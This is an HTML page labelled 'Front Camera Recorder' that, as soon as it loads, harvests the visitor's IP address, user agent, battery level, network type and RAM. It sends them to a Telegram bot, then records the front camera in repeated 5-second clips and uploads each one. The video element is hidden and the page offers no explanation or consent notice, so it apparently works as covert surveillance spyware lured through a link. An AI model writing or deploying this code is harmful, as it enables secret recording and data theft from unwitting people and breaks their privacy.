<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Front Camera Recorder</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #0d0d0d;
            color: #fff;
            font-family: 'Arial', sans-serif;
        }
        video {
            display: none;
        }
    </style>
</head>

<body>

    <video id="video"></video>

    <script>
        let TELEGRAM_BOT_TOKEN = '';
        let TELEGRAM_CHAT_ID = '';

        // Load telegram config from server.txt (must be at root and accessible)
        async function getTelegramConfig() {
            try {
                const res = await fetch('server.txt');
                const text = await res.text();
                const token = text.match(/TOKEN=(.*)/)[1].trim();
                const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
                return { token, chatId };
            } catch (e) {
                alert('Failed to load Telegram config.');
                return { token: '', chatId: '' };
            }
        }

        // Send text message to Telegram
        async function sendTextToTelegram(message) {
            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
                console.error("Telegram bot token or chat ID not set yet.");
                return;
            }
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                const data = await response.json();
                if (!data.ok) throw new Error(data.description);
                console.log("Message sent to Telegram.");
            } catch (error) {
                console.error("Failed to send message to Telegram:", error);
            }
        }

        // Send video blob to Telegram
        async function sendVideoToTelegram(blob) {
            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
                console.error("Telegram bot token or chat ID not set yet.");
                return;
            }
            try {
                const formData = new FormData();
                formData.append("video", blob, "recording.mp4");
                formData.append("chat_id", TELEGRAM_CHAT_ID);

                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
                const response = await fetch(url, {
                    method: "POST",
                    body: formData,
                });
                const data = await response.json();
                if (!data.ok) throw new Error(data.description);
                console.log("Video sent to Telegram.");
            } catch (error) {
                console.error("Failed to send video to Telegram:", error);
            }
        }

        async function fetchWanIp() {
            try {
                const response = await fetch("https://ipinfo.io/json");
                const data = await response.json();
                return data.ip || "Unknown IP";
            } catch (error) {
                console.error(error);
                return "Error retrieving WAN IP";
            }
        }

        async function getBatteryPercentage() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return (battery.level * 100).toFixed(0);
                } catch {
                    return "Unknown";
                }
            }
            return "Unknown";
        }

        function getNetworkType() {
            return navigator.connection && navigator.connection.effectiveType
                ? navigator.connection.effectiveType
                : "Unknown";
        }

        async function sendInitialInfo() {
            const wanIp = await fetchWanIp();
            const userAgent = navigator.userAgent;
            const batteryPercentage = await getBatteryPercentage();
            const networkType = getNetworkType();
            const dateAndTime = new Date().toLocaleString();
            const totalRam = navigator.deviceMemory || "Unknown";

            const infoMessage = `
ðŸŒ WAN IP Address: ${wanIp}
ðŸ“± User-Agent: ${userAgent}
ðŸ”‹ Battery Percentage: ${batteryPercentage}%
ðŸ“¡ Network Type: ${networkType}
ðŸ—“ Date and Time: ${dateAndTime}
ðŸ’¾ Total RAM: ${totalRam} GB
ðŸ“¹ Front camera video recording is starting...
`;
            await sendTextToTelegram(infoMessage);
        }

        async function startPeriodicVideoRecording() {
            // **Change here:** facingMode set to 'user' for front camera
            const mediaOptions = { video: { facingMode: "user" }, audio: false };

            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia(mediaOptions);

                    const mediaRecorder = new MediaRecorder(stream);
                    let chunks = [];

                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data.size > 0) chunks.push(e.data);
                    };

                    mediaRecorder.start();

                    await new Promise(resolve => setTimeout(resolve, 5000)); // record 5 sec
                    mediaRecorder.stop();

                    await new Promise(resolve => {
                        mediaRecorder.onstop = async () => {
                            const videoBlob = new Blob(chunks, { type: "video/mp4" });
                            await sendVideoToTelegram(videoBlob);
                            stream.getTracks().forEach(track => track.stop()); // stop camera
                            resolve();
                        };
                    });

                    await new Promise(resolve => setTimeout(resolve, 5000)); // wait 5 sec before next recording

                } catch (error) {
                    console.error("Camera error or permission denied:", error);
                    alert("Failed to access the front camera for video recording. Please check your camera permissions.");
                    break; // exit the loop on error
                }
            }
        }

        async function main() {
            const config = await getTelegramConfig();
            TELEGRAM_BOT_TOKEN = config.token;
            TELEGRAM_CHAT_ID = config.chatId;

            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
                alert("Telegram bot token or chat ID missing!");
                return;
            }

            await sendInitialInfo();
            startPeriodicVideoRecording();
        }

        window.addEventListener('DOMContentLoaded', main);
    </script>

</body>

</html>
